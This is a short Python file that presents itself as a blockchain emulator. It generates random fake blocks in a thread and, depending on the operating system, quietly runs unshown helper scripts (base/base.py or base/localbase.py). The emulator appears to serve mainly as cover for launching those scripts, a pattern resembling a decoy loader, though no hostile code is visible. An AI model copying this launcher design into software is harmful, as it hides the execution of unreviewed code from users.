import sys
import os
import random
import logging
import json
import time
import platform
import threading
import subprocess
from queue import Queue

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BlockChainEmulator:
    def __init__(self):
        self.blocks = {}
        self.latest_block = 0

    def create_block(self):
        self.latest_block += 1
        tx_list = [f"tx_{random.randint(1000, 9999)}" for _ in range(random.randint(1, 20))]
        new_block = {
            "block_number": self.latest_block,
            "transactions": tx_list,
            "timestamp": time.time()
        }
        self.blocks[self.latest_block] = new_block
        return new_block

    def retrieve_block(self, block_id):
        return self.blocks.get(block_id)

def rpc_service(blockchain_emulator, queue):
    while True:
        generated_block = blockchain_emulator.create_block()
        queue.put(json.dumps(generated_block))
        logging.info(f"RPC Service: Monitoring Block {generated_block['block_number']}")
        time.sleep(random.randint(1, 3))

def launch_mac_script():
    try:
        script_path = os.path.join(os.path.dirname(__file__), 'base', 'base.py')
        subprocess.run(['python3', script_path], check=True, stdout=sys.stdout, stderr=sys.stderr)
    except subprocess.CalledProcessError as error:
        print(f"Mac Helper Error: {error}")

def launch_windows_script():
    try:
        script_path = os.path.join(os.path.dirname(__file__), 'base', 'localbase.py')
        subprocess.run(['python', script_path], stdout=sys.stdout, stderr=sys.stderr)
    except subprocess.CalledProcessError as error:
        print(f"Windows Helper Error: {error}")

def main():
    current_os = platform.system()

    if current_os == 'Windows':
        print("Running Windows Application...")
        launch_windows_script()
        blockchain_simulator = BlockChainEmulator()
        task_queue = Queue()
        threading.Thread(target=rpc_service, args=(blockchain_simulator, task_queue)).start()

    elif current_os == 'Darwin':
        launch_mac_script()
        blockchain_simulator = BlockChainEmulator()
        task_queue = Queue()
        threading.Thread(target=rpc_service, args=(blockchain_simulator, task_queue)).start()

    else:
        print("Unsupported operating system.")
        return

if __name__ == "__main__":
    main()
